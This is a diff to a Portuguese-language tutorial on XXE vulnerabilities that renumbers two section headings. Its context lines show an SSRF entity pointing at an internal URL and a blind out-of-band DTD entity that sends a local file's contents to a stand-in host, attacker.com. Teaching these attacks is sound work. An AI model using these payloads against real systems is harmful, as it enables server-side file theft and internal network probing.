@@ -54,7 +54,7 @@ No exemplo XXE a seguir, a entidade externa fará com que o servidor faça uma s
 
       <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
  
-<h4>Explorando blind XXE exfiltrando dados out-of-band (OOB)</h4>
+<h4>3) Explorando blind XXE exfiltrando dados out-of-band (OOB)</h4>
  
 O processo para explorar a vulnerabilidade XXE Out-of-band (fora da banda) é semelhante ao uso de entidades de parâmetros com XXE in-band e envolve a criação de um DTD externo (definição de tipo de documento). Há uma grande diferença com esse tipo de ataque, o invasor precisa do analisador XML para fazer uma solicitação adicional a um servidor controlado pelo atacante. Isso é necessário para ler o conteúdo do arquivo local.
 
@@ -78,7 +78,7 @@ exemplo:
     <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?collect=%file;'>">
     %all;
  
-<h4>3) Blind XXE vulnerabilities</h4>
+<h4>4) Blind XXE vulnerabilities</h4>
 
 Muitas instâncias de vulnerabilidade XXE são blind (cegas). Isso significa que o aplicativo não retorna os valores de entidades externas definidas em suas respostas e, portanto, a recuperação direta dos arquivos do lado do servidor não é possível.
 
